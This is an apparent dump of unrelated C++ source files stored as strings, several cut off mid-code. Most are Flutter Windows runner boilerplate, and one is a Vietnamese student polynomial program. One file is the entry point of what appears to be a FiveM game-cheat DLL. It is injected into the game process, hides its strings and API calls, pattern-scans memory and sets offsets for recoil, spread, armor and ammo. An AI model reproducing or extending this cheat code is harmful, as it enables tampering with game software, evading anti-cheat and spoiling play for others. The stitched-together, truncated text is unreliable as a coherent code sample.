    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecommerce_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bloc_chat_app_demo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"Classes.hpp\"\r\n\r\n#include <native.hpp>\r\n\r\n#include <auth.hpp>\r\n#include <process.h>\r\nbool executedGiveWeaponToPed = false;\r\n#pragma warning(disable : 6031)\r\ntypedef struct _CLIENT_ID\r\n{\r\n\tHANDLE UniqueProcess;\r\n\tHANDLE UniqueThread;\r\n} CLIENT_ID, * PCLIENT_ID;\r\n\r\ntypedef NTSTATUS(NTAPI* RtlCreateUserThread_t)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, SIZE_T, SIZE_T, PTHREAD_START_ROUTINE, PVOID, PHANDLE, PCLIENT_ID);\r\nRtlCreateUserThread_t RtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(GetModuleHandle(\"ntdll.dll\"), \"RtlCreateUserThread\");\r\n\r\n\r\nBOOLEAN APIENTRY DllMain(HINSTANCE hk_dll, DWORD hk_reason, LPVOID hk_lpReserved)\r\n{\r\n\tUNREFERENCED_PARAMETER(hk_lpReserved);\r\n\r\n\tif (hk_reason == DLL_PROCESS_ATTACH)\r\n\t{\r\n\t\tDisableThreadLibraryCalls(hk_dll);\r\n\t\tif (DEBUG == 0)\r\n\t\t{\r\n\r\n\t\t\t\ttypedef BOOL(__stdcall* AllocConsole_t)();\r\n\t\t\t\tAllocConsole_t AllocConsole_o = (AllocConsole_t)SAFE_CALL(GetProcAddress)(SAFE_CALL(GetModuleHandleA)((E(\"kernel32.dll\"))), E(\"AllocConsole\"));\r\n\r\n\t\t\t\tAllocConsole_o();\r\n\t\t\t\tfreopen_s((FILE**)stdout, E(\"CONOUT$\"), E(\"w\"), stdout);\r\n\t\t}\r\n\r\n\r\n\r\n\r\n/*\r\n\t\t\tif (thread == TestScriptThread) {\r\n\r\n\t\t\t\tif (!executedGiveWeaponToPed) {\r\n\t\t\t\t\tWEAPON::GIVE_WEAPON_TO_PED(PLAYER::PLAYER_PED_ID(), 0xFAD1F1C9, (int)999, (bool)false, (bool)true);\r\n\r\n\t\t\t\t\texecutedGiveWeaponToPed = true;\r\n\t\t\t\t}\r\n\r\n\t\t\t}\r\n\t\t\t});\r\n\r\n\r\n\t\tDeleteScript(scriptID);\r\n\r\n\t\tAttachScripthook();*/\r\n\t\tFiveM::World = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 48 08 48 85 C9 74 52 8B 81\"), NULL, 7);\r\n\t\tFiveM::ReplayInterface = Memory::PatternScan(E(\"48 8D 0D ? ? ? ? 89 44 24 30 E8 ? ? ? ? 48 83 C4 28 C3 48 8B 05\"), NULL, 7);\r\n\t\tFiveM::W2S = Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\t\tFiveM::BonePos = Memory::PatternScan(E(\"48 89 5C 24 ?? 48 89 6C 24 ?? 48 89 74 24 ?? 57 48 83 EC 60 48 8B 01 41 8B E8 48 8B F2 48 8B F9 33 DB\"), NULL, NULL);\r\n\t\tFiveM::Camera = Memory::PatternScan(E(\"48 8B 05 ? ? ? ? 48 8B 98 ? ? ? ? EB\"), NULL, 7);\r\n\t\t//FiveM::Waypoint = Memory::PatternScan(E(\"4C 8D 05 ? ? ? ? 0F B7 C1\"), NULL, 7);\r\n     //   FiveM::IsOnFiveM = (bool)Memory::PatternScan(E(\"48 89 5C 24 ?? 55 56 57 48 83 EC 70 65 4C 8B 0C 25\"), NULL, NULL);\r\n\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10A8;\r\n\t\t\tFiveM::Armor = 0x14B8;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10C8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2E8;\r\n\t\t\tFiveM::Spread = 0x74;\r\n\t\t\tFiveM::ReloadMultiplier = 0x12C;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5E0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x25C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2060_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10B8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"planet_ui\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <ctype.h>\n#include <sstream>\n#include <string>\n#include <stdlib.h>\n#include <math.h>\n\nstruct Donthuc\n{\n    float he_so;\n    int bac;\n};\nstruct Node\n{\n    Donthuc donthuc;\n    Node* next;\n};\nstruct List\n{\n    Node *head, *tail;\n};\nvoid initialize(List &l);\n//\nvoid nhapDathuc(std::string &input);\nvoid chuan_hoa_chuoi(std::string &input);\n//\nDonthuc tao_don_thuc(float he_so, int bac);\nNode* tao_nut_dslk(Donthuc dt);\nvoid tao_dslk(List &l , std::string input);\nvoid them_nut(List &l, Node* node);\nvoid in_da_thuc(List l);\nvoid in_don_thuc(Donthuc p);\n//\nfloat quy_doi_ve_thap_phan(std::string he_so);\n//\nvoid swap(Donthuc &a, Donthuc &b);\nvoid sx_da_thuc_bac_giam_dan(List l);\n//\nvoid xoa_phantu_sau_nut(List &l, Node* nut_hien_tai);\nvoid xoa_don_thuc(List &l, int bac);\n//\nvoid rut_gon_dathuc(List &l);\n//\nvoid them_vao_cuoi_ds(List &l, Node* node);\nvoid them_vao_dau_ds(List &l, Node* node);\nvoid them_vao_sau_nut(List &l, Node* node, Node* current);\nvoid them_mot_don_thuc(List &l, Donthuc p);\n//\nfloat tinh_gia_tri_da_thuc(List l, float x);\nvoid cong_da_thuc(List dathuc1, List dathuc2); \nvoid tru_da_thuc(List dathuc1, List dathuc2);\nvoid nhan_da_thuc(List dathuc1, List dathuc2);\n\nint main()\n{\n    List dathuc1, dathuc2;\n    std::string input;\n    initialize(dathuc1);\n\tinitialize(dathuc2);\n\t// tao da thuc 1\n    nhapDathuc(input);\n    chuan_hoa_chuoi(input);\n    tao_dslk(dathuc1, input);\n\t// tao da thuc 2\n\tnhapDathuc(input);\n    chuan_hoa_chuoi(input);\n    tao_dslk(dathuc2, input);\n\n\trut_gon_dathuc(dathuc1);\n\t//them_mot_don_thuc(dathuc1, tao_don_thuc(2, 3));\n\tin_da_thuc(dathuc1);\n\tin_da_thuc(dathuc2);\n\tstd::cout << \"Tong: \" << std::endl;\n\tcong_da_thuc(dathuc1, dathuc2);\n\tstd::cout << \"Hieu: \" << std::endl;\n\ttru_da_thuc(dathuc1, dathuc2);\n\tstd::cout << \"Nhan: \" << std::endl;\n\tnhan_da_thuc(dathuc1, dathuc2);\n\t//std::cout << \"gia tri cua da thuc khi x = 2: \" << tinh_gia_tri_da_thuc(dathuc1, 2) << std::endl;\n\tsystem(\"pause\");\n\treturn 0;\n}\n\nvoid initialize(List &l)\n{\n    l.head = l.tail = NULL;\n}\nvoid nhapDathuc(std::string &input)\n{\n    std::cout << \"Nhap da thuc: \";\n    std::getline(std::cin, input);\n}\nvoid chuan_hoa_chuoi(std::string &input)\n{\n    std::stringstream ss(input);\n    std::string res = \"\", word;\n    while (ss >> word)\n    {\n        res += tolower(word[0]);\n        for (int j = 1; j < word.size(); j++)\n            res += tolower(word[j]);\n        res += \"\";\n    }\n    res += word[word.size()];\n    res.pop_back();\n    input.assign(res);\n}\nDonthuc tao_don_thuc(float he_so, int bac)\n{\n    Donthuc donthuc;\n    donthuc.he_so = he_so;\n    donthuc.bac = bac;\n    return donthuc;\n}\nNode* tao_nut_dslk(Donthuc dt)\n{\n    Node* node = new Node;\n    if (node == NULL) return NULL;\n    node->donthuc = dt;\n    node->next = NULL;\n    return node;\n}\nvoid tao_dslk(List &l , std::string input)\n{\n    int i = 0, vt = 0;\n    Node* node = NULL;\n    while (input[i] != '\\0')\n    {\n        if (input[i] == 'x')\n        {\n            float he_so = quy_doi_ve_thap_phan(input.substr(vt, i - vt));\n\t\t\tint bac = input[i + 1] == '^' ? bac = std::stoi(input.substr(i+2, input.find('+', vt - i - 2))) : 1;\n            node = tao_nut_dslk(tao_don_thuc(he_so, bac));\n            them_nut(l, node);\n            vt = input.find('+', vt) + 1;\n        }\n        ++i;\n    }\n}\nvoid them_nut(List &l, Node* node)\n{\n    if(l.head == NULL)\n        l.head = node;\n    else\n        l.tail->next = node;\n    l.tail = node;\n}\nfloat quy_doi_ve_thap_phan(std::string he_so)\n{\n    if (he_so == \"\") return 1;\n    std::istringstream iss(he_so);\n    int numerator, 